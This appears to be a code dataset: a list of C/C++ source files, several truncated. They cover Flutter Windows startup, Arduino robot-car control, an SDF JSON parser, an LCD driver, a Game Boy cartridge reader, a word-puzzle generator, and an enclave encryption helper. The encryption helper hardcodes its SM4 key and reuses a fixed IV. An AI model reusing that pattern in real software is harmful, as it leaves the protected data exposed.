    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <Arduino.h>\n#include <SPI.h>\n#include <Wire.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n#include <PID_v1.h>\n#include <SoftwareSerial.h>\n  SoftwareSerial arduinoSerial = SoftwareSerial(10, 11);//RX TX || PB4 PB5\n#include <Servo.h>\n\nunsigned long time;\n\n//FaBoPWM faboPWM;\nint pos = 0;\nint MAX_VALUE = 2000;\nint MIN_VALUE = 300;\n\n#define SERIAL  Serial\n#define BTSERIAL Serial3\n\n#define LOG_DEBUG\n\n#ifdef LOG_DEBUG\n  #define M_LOG SERIAL.print\n#else\n  #define M_LOG BTSERIAL.println\n#endif\n\n////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////\n////////////////////////////////////////////////////////////////////////////////////////\n/*\n  BELOW BY GROUP C4-C\n*/\n\n// enum class for states with different function executions\nenum class Mode {\n   //Wifi communication enum class Mode {\n  WIFI_MANUAL, //Wifi communication \n  NORMAL, // Obstacle avoidance + Line tracking + Tennis ball detection + Wifi communication\n  OBSTACLE_DETECTED, // -line tracking, when obstacle detected\n  TENNIS_DETECTED, // -obstacle avoidance, when tennis ball detected but not catched\n  CATCHING, // +Tennis ball catch, -obstacle avoidance, -line tracking, when catching tennis ball\n  CATCHED // +Tennis ball catch, when tennis ball catched by arm\n} Mode, Last_Mode;\n\nenum class WIFIMODE {\n  NONE,\n  M1,\n  M2,\n  M3,\n  M4  \n} WifiMode;\n\n//infrared sensors ||left:out-gnd-vcc:right||\n#define INFRARED1 25 //front left PA3\n#define INFRARED2 28 //front right PA6\n#define INFRARED3 29 //left PA7\n#define INFRARED4 30 //right PC7\n#define INFRARED5 32 //back PC5\nint Infrared_front_left, Infrared_front_right;\nint Infrared_left, Infrared_right, Infrared_back;\nint Infrared_combined = 0b0000;\n\n\n//grayscale sensors\n#define GRAYSCALE1 A3 //left most PF1\n#define GRAYSCALE2 A2 //left second PF2\n#define GRAYSCALE3 A6 //middle PF3\n#define GRAYSCALE4 A7 //right second PF4\n#define GRAYSCALE5 A8 //right most PF5\ndouble Grayscale_middle_left, Grayscale_middle_right;\ndouble Grayscale_middle;\ndouble Grayscale_left, Grayscale_right;\nint Grayscale_combined = 0b00000;\n\n\n//ultrasonic sensors\n#define SONAR_TRIG 48 //PA7\n#define SONAR_ECHO 47 //PA6\ndouble Sonar_distance_in_cm;\nint done, start_time;\n\n//flags to determine whether other functions should be executed\nbool Obstacle_flag = false;\nbool Front_flag = false;\nbool Left_flag = false;\nbool Right_flag = false;\nint retrieve_flag = 0; // 0: no retrieve, 1: front obstacle, 2: avoid obstacle, 3: conduct go left, 4:conduct go right\nint front_cnt = 0, left_cnt = 0, right_cnt = 0;\n\n// bool Line_flag = false;\nbool Rotate_flag = false; // whether continue rotation\nint rotate_cnt = 0;\nbool Tennis_flag = false;\nbool Catching_flag = false;\nbool Catched_flag = false;\nbool Arm_flag = false;\nint Arm_cnt = 0;\n\n// back to line\nint last_time = 0, shift_stop_time = 0;\nfloat last_avoid_move_x = 0.0;\nfloat last_avoid_move_y = 0.0;\nfloat last_avoid_move_z = 0.0;\n\n\n#define Wheel_Radius 0.04 //m\n#define MOTOR_KP 0.6\n#define MOTOR_KI 0.0\n#define MOTOR_KD 0.0\n#define CLIP(x, min, max) if (x < min) x = min; if (x > max) x = max;\n#define LOW_SPEED 0.4\n#define MEDIUM_SPEED 0.6\n#define HIGH_SPEED 0.8\ndouble all_speed_set = LOW_SPEED;\n\n//WIFI\nString  message = \"\";\n\n//Vision\nString vision_message = \"\";\n\n//Servo motor\n#define PitchPin  4 // PG5 \n#define YawPin 13 // PB7\n#define ArmPin1 46 //PL3\n#define ArmPin2 45 //PL4\nServo PitchServo; // 10-150\nServo YawServo; // 0-180\nServo ArmServo1; // 0-180\nServo ArmServo2; // 0-180\nint angle;\n\nclass DCMotor {\n  private:\n      int pwmPin; // PWM pin for motor speed control\n      int dirAPin;\n      int dirBPin;\n\n  public:\n      int encoderAPin;\n      int encoderBPin;\n      double ecd; // Encoder value\n      double last_ecd;\n      double speed;\n      double speed_set;\n      double pwm;\n      double pwm_set;\n      String wifi_cmd;\n\n      DCMotor(int pwm, int dirA, int dirB, int encoderA, int encoderB);\n      void setMotor(int analogSpeed);\n      void setSpeed(int analogSpeed);\n      void setDirection(int dir);\n      void encoderSubroutineA();\n      void encoderSubroutineB();\n};\n\nclass Chassis_control_t {\n  private:\n\n  public:\n    double vx, vy, wz;\n    String wifi_cmd;\n    int move_cnt;\n    int move_flag;\n    int target_dir;\n\n} Chassis_control;\n\nclass Gimbal_control_t {\n  private:\n\n  public:\n    int pitch, yaw;\n    int cnt;\n    int scan_cnt;\n    int scan_flag;\n    int target;\n    int target_flag; // 0: no target, 1: target detected \n\n} Gimbal_control;\n\nclass Vision_t {\n  private:\n\n  public:\n    int yaw_dir;\n    int target_flag;\n    int catch_flag;\n\n} Vision;\n\nconst double EPRA = 660;\nconst double EPRB = 660;\nconst double EPRC = 660;\nconst double EPRD = 660;\n\nconst int pwmPin1 = 12; const int dir1A = 34; const int dir1B = 35; const int encoder1A = 18; const int encoder1B = 31; // A M1\nconst int pwmPin2 = 8; const int dir2A = 37; const int dir2B = 36; const int encoder2A = 19; const int ",
    "/**\n *  Copyright 2024 Niklas Meyer\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *  http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n */\n\n#include <string>\n#include <nlohmann/json.hpp>\n#include \"matter.h\"\n#include \"sdf.h\"\n\nusing json = nlohmann::ordered_json;\n\n/*\n * Parse common qualities from json into a commonQualityType object.\n */\nint parseCommonQualities(const json& common_qualities_json, commonQualityType& commonQuality)\n{\n    if (common_qualities_json.contains(\"description\"))\n        common_qualities_json.at(\"description\").get_to(commonQuality.description);\n\n    if (common_qualities_json.contains(\"label\"))\n        common_qualities_json.at(\"label\").get_to(commonQuality.label);\n\n    if (common_qualities_json.contains(\"$comment\"))\n        common_qualities_json.at(\"$comment\").get_to(commonQuality.$comment);\n\n    if (common_qualities_json.contains(\"sdfRef\"))\n        common_qualities_json.at(\"sdfRef\").get_to(commonQuality.sdfRef);\n\n    if (common_qualities_json.contains(\"sdfRequired\"))\n        common_qualities_json.at(\"sdfRequired\").get_to(commonQuality.sdfRequired);\n\n    return 0;\n}\n\n/*\n * Function prototype used for recursive calls.\n */\nint parseDataQualities(const json& data_qualities_json, dataQualityType& dataQuality);\n\n/*\n * Parse a sdfChoice from json into a dataQualityType map.\n */\nint parseSdfChoice(const json& sdf_choice_json, std::map<std::string, dataQualityType>& sdfChoiceMap)\n{\n    // Iterate through all sdfChoice items and parse them individually\n    for (const auto& choice : sdf_choice_json.items()){\n        dataQualityType dataQuality;\n        parseDataQualities(choice.value(), dataQuality);\n        sdfChoiceMap.insert({choice.key(), dataQuality});\n    }\n\n    return 0;\n}\n\n/*\n * Parse data qualities from json into a dataQualityType object.\n */\nint parseDataQualities(const json& data_qualities_json, dataQualityType& dataQuality)\n{\n    // Parse the common qualities\n    parseCommonQualities(data_qualities_json, dataQuality);\n\n    // Parse the remaining fields\n    if (data_qualities_json.contains(\"unit\"))\n        data_qualities_json.at(\"unit\").get_to(dataQuality.unit);\n\n    if (data_qualities_json.contains(\"nullable\"))\n        data_qualities_json.at(\"nullable\").get_to(dataQuality.nullable);\n\n    if (data_qualities_json.contains(\"contentFormat\"))\n        data_qualities_json.at(\"contentFormat\").get_to(dataQuality.contentFormat);\n\n    if (data_qualities_json.contains(\"sdfType\"))\n        data_qualities_json.at(\"sdfType\").get_to(dataQuality.sdfType);\n\n    if (data_qualities_json.contains(\"sdfChoice\"))\n        parseSdfChoice(data_qualities_json.at(\"sdfChoice\"), dataQuality.sdfChoice);\n\n    if (data_qualities_json.contains(\"enum\"))\n        data_qualities_json.at(\"enum\").get_to(dataQuality.enum_);\n\n    return 0;\n}\n\n/*\n * Parse a sdfEvent from json into a sdfEventType object.\n */\nint parseSdfEvent(const json& sdf_event_json, sdfEventType& sdfEvent)\n{\n    // Parse the common qualities\n    parseCommonQualities(sdf_event_json, sdfEvent);\n\n    // Parse the remaining fields\n    if (sdf_event_json.contains(\"sdfOutputData\"))\n        parseDataQualities(sdf_event_json.at(\"sdfOutputData\"), sdfEvent.sdfOutputData);\n\n    // Iterate through all items inside sdfData and parse them individually\n    if (sdf_event_json.contains(\"sdfData\")){\n        for (const auto& data : sdf_event_json.at(\"sdfData\").items()) {\n            dataQualityType sdfData;\n            parseDataQualities(data.value(), sdfData);\n            sdfEvent.sdfData.insert({data.key(), sdfData});\n        }\n    }\n\n    return 0;\n}\n\n/*\n * Parse a sdfAction from json into a sdfActionType object.\n */\nint parseSdfAction(const json& sdf_action_json, sdfActionType& sdfAction)\n{\n    // Parse the common qualities\n    parseCommonQualities(sdf_action_json, sdfAction);\n\n    // Parse the remaining fields\n    if (sdf_action_json.contains(\"sdfInputData\"))\n        parseDataQualities(sdf_action_json.at(\"sdfInputData\"), sdfAction.sdfInputData);\n\n    if (sdf_action_json.contains(\"sdfOutputData\"))\n        parseDataQualities(sdf_action_json.at(\"sdfOutputData\"), sdfAction.sdfOutputData);\n\n    // Iterate through all items inside sdfData and parse them individually\n    if (sdf_action_json.contains(\"sdfData\")){\n        for (const auto& data : sdf_action_json.at(\"sdfData\").items()) {\n            dataQualityType sdfData;\n            parseDataQualities(data.value(), sdfData);\n            sdfAction.sdfData.insert({data.key(), sdfData});\n        }\n    }\n\n    return 0;\n}\n\n/*\n * Parse a sdfProperty from json into a sdfPropertyType ",
    "// Based on the work by DFRobot\n\n#include \"LiquidCrystal_I2C.h\"\n#include <inttypes.h>\n#if defined(ARDUINO) && ARDUINO >= 100\n\n#include \"Arduino.h\"\n\n#define printIIC(args)\tWire.write(args)\ninline size_t LiquidCrystal_I2C::write(uint8_t value) {\n\tsend(value, Rs);\n\treturn 1;\n}\n\n#else\n#include \"WProgram.h\"\n\n#define printIIC(args)\tWire.send(args)\ninline void LiquidCrystal_I2C::write(uint8_t value) {\n\tsend(value, Rs);\n}\n\n#endif\n#include \"Wire.h\"\n\n\n\n// When the display powers up, it is configured as follows:\n//\n// 1. Display clear\n// 2. Function set: \n//    DL = 1; 8-bit interface data \n//    N = 0; 1-line display \n//    F = 0; 5x8 dot character font \n// 3. Display on/off control: \n//    D = 0; Display off \n//    C = 0; Cursor off \n//    B = 0; Blinking off \n// 4. Entry mode set: \n//    I/D = 1; Increment by 1\n//    S = 0; No shift \n//\n// Note, however, that resetting the Arduino doesn't reset the LCD, so we\n// can't assume that its in that state when a sketch starts (and the\n// LiquidCrystal constructor is called).\n\nLiquidCrystal_I2C::LiquidCrystal_I2C(uint8_t lcd_Addr,uint8_t lcd_cols,uint8_t lcd_rows)\n{\n  _Addr = lcd_Addr;\n  _cols = lcd_cols;\n  _rows = lcd_rows;\n  _backlightval = LCD_NOBACKLIGHT;\n}\n\nvoid LiquidCrystal_I2C::oled_init(){\n  _oled = true;\n\tinit_priv();\n}\n\nvoid LiquidCrystal_I2C::init(){\n\tinit_priv();\n}\n\nvoid LiquidCrystal_I2C::init_priv()\n{\n\tWire.begin();\n\t_displayfunction = LCD_4BITMODE | LCD_1LINE | LCD_5x8DOTS;\n\tbegin(_cols, _rows);  \n}\n\nvoid LiquidCrystal_I2C::begin(uint8_t cols, uint8_t lines, uint8_t dotsize) {\n\tif (lines > 1) {\n\t\t_displayfunction |= LCD_2LINE;\n\t}\n\t_numlines = lines;\n\n\t// for some 1 line displays you can select a 10 pixel high font\n\tif ((dotsize != 0) && (lines == 1)) {\n\t\t_displayfunction |= LCD_5x10DOTS;\n\t}\n\n\t// SEE PAGE 45/46 FOR INITIALIZATION SPECIFICATION!\n\t// according to datasheet, we need at least 40ms after power rises above 2.7V\n\t// before sending commands. Arduino can turn on way befer 4.5V so we'll wait 50\n\tdelay(50); \n  \n\t// Now we pull both RS and R/W low to begin commands\n\texpanderWrite(_backlightval);\t// reset expanderand turn backlight off (Bit 8 =1)\n\tdelay(1000);\n\n  \t//put the LCD into 4 bit mode\n\t// this is according to the hitachi HD44780 datasheet\n\t// figure 24, pg 46\n\t\n\t  // we start in 8bit mode, try to set 4 bit mode\n   write4bits(0x03 << 4);\n   delayMicroseconds(4500); // wait min 4.1ms\n   \n   // second try\n   write4bits(0x03 << 4);\n   delayMicroseconds(4500); // wait min 4.1ms\n   \n   // third go!\n   write4bits(0x03 << 4); \n   delayMicroseconds(150);\n   \n   // finally, set to 4-bit interface\n   write4bits(0x02 << 4); \n\n\n\t// set # lines, font size, etc.\n\tcommand(LCD_FUNCTIONSET | _displayfunction);  \n\t\n\t// turn the display on with no cursor or blinking default\n\t_displaycontrol = LCD_DISPLAYON | LCD_CURSOROFF | LCD_BLINKOFF;\n\tdisplay();\n\t\n\t// clear it off\n\tclear();\n\t\n\t// Initialize to default text direction (for roman languages)\n\t_displaymode = LCD_ENTRYLEFT | LCD_ENTRYSHIFTDECREMENT;\n\t\n\t// set the entry mode\n\tcommand(LCD_ENTRYMODESET | _displaymode);\n\t\n\thome();\n  \n}\n\n/********** high level commands, for the user! */\nvoid LiquidCrystal_I2C::clear(){\n\tcommand(LCD_CLEARDISPLAY);// clear display, set cursor position to zero\n\tdelayMicroseconds(2000);  // this command takes a long time!\n  if (_oled) setCursor(0,0);\n}\n\nvoid LiquidCrystal_I2C::home(){\n\tcommand(LCD_RETURNHOME);  // set cursor position to zero\n\tdelayMicroseconds(2000);  // this command takes a long time!\n}\n\nvoid LiquidCrystal_I2C::setCursor(uint8_t col, uint8_t row){\n\tint row_offsets[] = { 0x00, 0x40, 0x14, 0x54 };\n\tif ( row > _numlines ) {\n\t\trow = _numlines-1;    // we count rows starting w/0\n\t}\n\tcommand(LCD_SETDDRAMADDR | (col + row_offsets[row]));\n}\n\n// Turn the display on/off (quickly)\nvoid LiquidCrystal_I2C::noDisplay() {\n\t_displaycontrol &= ~LCD_DISPLAYON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\nvoid LiquidCrystal_I2C::display() {\n\t_displaycontrol |= LCD_DISPLAYON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\n\n// Turns the underline cursor on/off\nvoid LiquidCrystal_I2C::noCursor() {\n\t_displaycontrol &= ~LCD_CURSORON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\nvoid LiquidCrystal_I2C::cursor() {\n\t_displaycontrol |= LCD_CURSORON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\n\n// Turn on and off the blinking cursor\nvoid LiquidCrystal_I2C::noBlink() {\n\t_displaycontrol &= ~LCD_BLINKON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\nvoid LiquidCrystal_I2C::blink() {\n\t_displaycontrol |= LCD_BLINKON;\n\tcommand(LCD_DISPLAYCONTROL | _displaycontrol);\n}\n\n// These commands scroll the display without changing the RAM\nvoid LiquidCrystal_I2C::scrollDisplayLeft(void) {\n\tcommand(LCD_CURSORSHIFT | LCD_DISPLAYMOVE | LCD_MOVELEFT);\n}\nvoid LiquidCrystal_I2C::scrollDisplayRight(void) {\n\tcommand(LCD_CURSORSHIFT | LCD_DISPLAYMOVE | LCD_MOVERIGHT);\n}\n\n// This is for text that flows Left to Right\nvoid LiquidCrystal_I2C::leftToRight(void) {\n\t_displaymode |= LCD_ENTRYLEFT;\n\tcommand(LCD_ENTR",
    "#include \"../include/util.h\"\n\nextern \"C\" void eapp_print(const char*s, ...);\n\nconst unsigned char key[16]={0x98,0xff,0xf6,0x7e,0x64,0xe4,0x6b,0xe5,0xee,0x2e,0x05,0xcc,0x9a,0xf6,0xd0,0x12};\nconst unsigned char IV[16] ={0x2d,0xfb,0x42,0x9a,0x48,0x69,0x7c,0x34,0x00,0x6d,0xa8,0x86,0x9a,0xf6,0xd0,0x12};\n\nvoid printHex(unsigned char *c, int n)\n{\n    int i, rounds;\n    rounds = n / 16;\n    for (i = 0; i < rounds; i++) {\n        eapp_print(\"%d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d\\n\",\n                   *(c+i*16), *(c+i*16+1), *(c+i*16+2), *(c+i*16+3),\n                   *(c+i*16+4), *(c+i*16+5), *(c+i*16+6), *(c+i*16+7),\n                   *(c+i*16+8), *(c+i*16+9), *(c+i*16+10), *(c+i*16+11),\n                   *(c+i*16+12), *(c+i*16+13), *(c+i*16+14), *(c+i*16+15));\n    }\n}\n\nuint256_t bswap256(const uint256_t& value){\n    uint64_t uint64_list[4] = {value.upper().upper(), value.upper().lower(), value.lower().upper(), value.lower().lower()};\n    for(int i = 0; i < 4; i++){\n        uint64_list[i] = __builtin_bswap64(uint64_list[i]);\n    }\n    uint128_t new_upper(uint64_list[3], uint64_list[2]);\n    uint128_t new_lower(uint64_list[1], uint64_list[0]);\n    uint256_t new_value(new_upper, new_lower);\n    return new_value;\n}\n\nvoid store_uint256_to_uint8_vector(const uint256_t& value, uint8_t* to){\n    uint256_t new_value = bswap256(value);\n    std::memcpy(to, &new_value, sizeof(new_value));\n}\n\nuint256_t uint8_vector_to_uint256(const uint8_t* from, size_t size){\n    uint8_t uint8_list[32] = {};\n    int offset = 32 - size;\n    std::memcpy(uint8_list + offset, from, size);\n    uint256_t old_value;\n    std::memcpy(&old_value, uint8_list, sizeof(old_value));\n    return bswap256(old_value);\n}\n\nvoid print_uint256(const uint256_t& value, int base){\n    std::string value_string = value.str(base);\n    char* real_value_string = (char*)value_string.data();\n    eapp_print(\"value = %s\\n\", real_value_string);\n}\n\nvoid encrypt_data(unsigned char* plaintext, int plaintext_len, unsigned char* ciphertext, int* ciphertext_len){\n    *ciphertext_len = OCB_CipherText_Len(plaintext_len);\n    unsigned char cipher_with_tag[*ciphertext_len + OCB_TAG_SIZE];\n\n    SM4_OCB_Encrypt(key, IV, (unsigned int)16, plaintext, plaintext_len, NULL, 0, cipher_with_tag);\n\n    *ciphertext_len = (*ciphertext_len) + OCB_TAG_SIZE;\n    for(int i = 0; i < *ciphertext_len; i++){\n        ciphertext[i] = cipher_with_tag[i];\n    }\n}\n\nvoid decrypt_data(unsigned char* cipher_with_tag, int cipher_with_tag_len, unsigned char* plaintext, int* plaintext_len){\n    *plaintext_len = cipher_with_tag_len - OCB_TAG_SIZE;\n    int ret;\n    ret = SM4_OCB_Decrypt(key, IV, (unsigned int)16, cipher_with_tag, *plaintext_len, NULL, 0, plaintext);\n    if(ret != 0){\n        eapp_print(\"Fail Assenticate\\n\");\n    }\n}",
    "\n#include \"CartridgeGBMBC1.hpp\"\n#include \"all.h\"\n#include \"gbrw.h\"\n\n#include <stdio.h>\n\n#pragma mark public provider\nuint32_t CartridgeGBMBC1::readROM(void *buf_, uint32_t size, uint32_t offset){\n  uint8_t *buf = (uint8_t*)buf_;\n  uint32_t bankCount = getROMBankCount();\n\n  // Switch into advanced banking mode\n  gb_write_byte(0x6000, 0x1);\n\n  uint32_t readSize = 0;\n  for (uint32_t i = offset >> 14; i < bankCount; i++) {\n      if (readSize >= size) {\n          break;\n      }\n\n      gb_write_byte(0x2000, i & 0x1F);\n      gb_write_byte(0x4000, i >> 5);\n\n      uint32_t offsetInBank = offset & 0x3FFF;\n      uint32_t toRead = (16 * 1024) - offsetInBank;\n      if (size - readSize < toRead) {\n          toRead = size - readSize;\n      }\n\n      switch (i) {\n          case 0x00:\n          case 0x20:\n          case 0x40:\n          case 0x60:\n              gb_read(0x0 + offsetInBank, buf, toRead);\n              break;\n\n          default:\n              gb_read(0x4000 + offsetInBank, buf, toRead);\n              break;\n      }\n\n      readSize += toRead;\n      buf += toRead;\n      offset = 0;\n  }\n\n  // Reset bank selection\n  gb_write_byte(0x2000, 0x0);\n  gb_write_byte(0x4000, 0x0);\n\n  // Switch back to simple banking mode\n  gb_write_byte(0x6000, 0x0);\n\n  return readSize;\n}\n\nuint32_t CartridgeGBMBC1::readRAM(void *buf_, uint32_t size, uint32_t offset){\n  uint8_t *buf = (uint8_t*)buf_;\n  uint32_t ramBankCount = getRAMBankCount();\n\n  if (ramBankCount == 0) {\n      return 0;\n  }\n\n  // Switch to advanced banking mode\n  gb_write_byte(0x6000, 0x1);\n\n  // Enable RAM\n  gb_write_byte(0x0000, 0x0A);\n\n  uint32_t readSize = 0;\n  for (uint32_t i = offset >> 13; i < ramBankCount; i++) {\n      if (readSize >= size) {\n          break;\n      }\n\n      gb_write_byte(0x4000, i);\n\n      uint32_t offsetInBank = offset & 0x1FFF;\n      uint32_t toRead = (8 * 1024) - offsetInBank;\n      if (size - readSize < toRead) {\n          toRead = size - readSize;\n      }\n\n      gb_read(0xA000 + offsetInBank, buf, toRead);\n\n      readSize += toRead;\n      buf += toRead;\n      offset = 0;\n  }\n\n  // Disable RAM\n  gb_write_byte(0x0000, 0x00);\n\n  // Reset bank selection\n  gb_write_byte(0x4000, 0x0);\n\n  // Switch back to simple banking mode\n  gb_write_byte(0x6000, 0x0);\n\n  return readSize;\n}\n\nuint32_t CartridgeGBMBC1::writeRAM(const void *buf_, uint32_t size, uint32_t offset){\n  const uint8_t *buf = (uint8_t*)buf_;\n  uint32_t ramBankCount = getRAMBankCount();\n\n  if (ramBankCount == 0) {\n      return 0;\n  }\n\n  // Switch to advanced banking mode\n  gb_write_byte(0x6000, 0x1);\n\n  // Enable RAM\n  gb_write_byte(0x0000, 0x0A);\n\n  uint32_t writeSize = 0;\n  for (uint32_t i = offset >> 13; i < ramBankCount; i++) {\n      if (writeSize >= size) {\n          break;\n      }\n\n      gb_write_byte(0x4000, i);\n\n      uint32_t offsetInBank = offset & 0x1FFF;\n      uint32_t toWrite = (8 * 1024) - offsetInBank;\n      if (size - writeSize < toWrite) {\n          toWrite = size - writeSize;\n      }\n\n      gb_write(0xA000 + offsetInBank, buf, toWrite);\n\n      writeSize += toWrite;\n      buf += toWrite;\n      offset = 0;\n  }\n\n  // Disable RAM\n  gb_write_byte(0x0000, 0x00);\n\n  // Reset bank selection\n  gb_write_byte(0x4000, 0x0);\n\n  // Switch back to simple banking mode\n  gb_write_byte(0x6000, 0x0);\n\n  return writeSize;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\n#include <iostream>\n#include <map>\n#include <string>\n#include <vector>\n#include <random>\n#include <set>\n#include <fstream>\n#include <sstream>\n#include <algorithm>\n\nusing namespace std;\n\nstruct Pair {\n\tstring word;\n\tstring previous;\n\tstring next;\n\tint position = 0;\n};\n\nstruct WordSet {\n\tstring word;\n\tvector<string> next;\n\tvector<string> previous;\n\tbool is_unique = false;\n};\n\nvector<string> split(const string& text)\n{\n\tvector<string> output;\n\tstring temp = \"\";\n\n\tfor (char c : text) {\n\t\tif (c == ' ') {\n\t\t\toutput.push_back(temp);\n\t\t\ttemp = \"\";\n\t\t}\n\t\telse {\n\t\t\ttemp += c;\n\t\t}\n\t}\n\n\tif (!temp.empty()) {\n\t\toutput.push_back(temp);\n\t}\n\n\treturn output;\n\n}\n\nvector<Pair> find_seed(const vector<string>& words) {\n\tmap<string, int> word_count;\n\tmap<string, int> word_positions;\n\n\t// Count each word and remember the first position\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tword_count[words[i]]++;\n\t\t// Only record the position the first time the word is encountered\n\t\tif (word_count[words[i]] == 1) {\n\t\t\tword_positions[words[i]] = i;\n\t\t}\n\t}\n\n\tvector<Pair> seed;\n\n\t/* Now add to the seed only those words with a count of 1 */\n\tfor (const auto& wc : word_count) {\n\t\tif (wc.second == 1) {\n\t\t\tseed.push_back({ wc.first, \"\", \"\", word_positions[wc.first]});\n\t\t}\n\t}\n\n\treturn seed;\n}\n\nint get_word_index(const string& word, vector<Pair>& words)\n{\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i].word == word) {\n\t\t\treturn i;\n\t\t}\n\t}\n\n\treturn -1;\n\n}\n\nvector<int> get_instances_of_word(string& word, vector<string>& words)\n{\n\tvector<int> output;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i] == word) {\n\t\t\toutput.push_back(i);\n\t\t}\n\t}\n\n\treturn output;\n\n}\n\nstd::map<std::string, WordSet> rule_set(vector<string>& words, vector<Pair>& seed) {\n\tstd::map<std::string, WordSet> rules;\n\n\tfor (const auto& word : words) {\n\t\tauto& ws = rules[word]; // This ensures a WordSet is created for each word, even if it's not in the seed.\n\t}\n\n\t// Process seed words\n\tfor (const auto& s : seed) {\n\t\trules[s.word].is_unique = true;\n\t}\n\n\t// Construct rules based on words vector\n\tfor (size_t i = 0; i < words.size(); ++i) {\n\t\tstring& word = words[i];\n\t\tif (i > 0) {\n\t\t\t// Add the previous word if not the first word\n\t\t\trules[word].previous.push_back(words[i - 1]);\n\t\t}\n\t\tif (i < words.size() - 1) {\n\t\t\t// Add the next word if not the last word\n\t\t\trules[word].next.push_back(words[i + 1]);\n\t\t}\n\t}\n\n\t// Remove duplicates from previous and next vectors\n\tfor (auto& rule : rules) {\n\t\tauto& ws = rule.second;\n\t\tstd::sort(ws.previous.begin(), ws.previous.end());\n\t\tws.previous.erase(std::unique(ws.previous.begin(), ws.previous.end()), ws.previous.end());\n\n\t\tstd::sort(ws.next.begin(), ws.next.end());\n\t\tws.next.erase(std::unique(ws.next.begin(), ws.next.end()), ws.next.end());\n\t}\n\n\treturn rules;\n}\n\nvoid initialize_array(std::vector<std::string>& arr, int size) {\n\tarr.resize(size);\n\tfor (int i = 0; i < size; ++i) {\n\t\tarr[i] = \"_____\";\n\t}\n}\n\nbool vec_contains_str(vector<string>& words, string& word)\n{\n\tfor (string s : words) {\n\t\tif (s == word) { return true; }\n\t}\n\treturn false;\n}\n\nint get_combinations(string& left, string& right, std::map<std::string, WordSet>& rule_set)\n{\n\tvector<string> combos;\n\tif (left != \"_____\") {\n\t\tcombos = rule_set[left].next;\n\t}\n\t\n\tif (right != \"_____\") {\n\t\tif (combos.empty()) {\n\t\t\tcombos = rule_set[right].previous;\n\t\t}\n\t\telse {\n\t\t\tfor (string s : rule_set[right].previous) {\n\t\t\t\tif (!vec_contains_str(combos, s)) { combos.push_back(s); }\n\t\t\t}\n\t\t}\n\t}\n\n\treturn (combos.empty() ? INT_MAX : combos.size());\n}\n\n/* \nindex: index is the 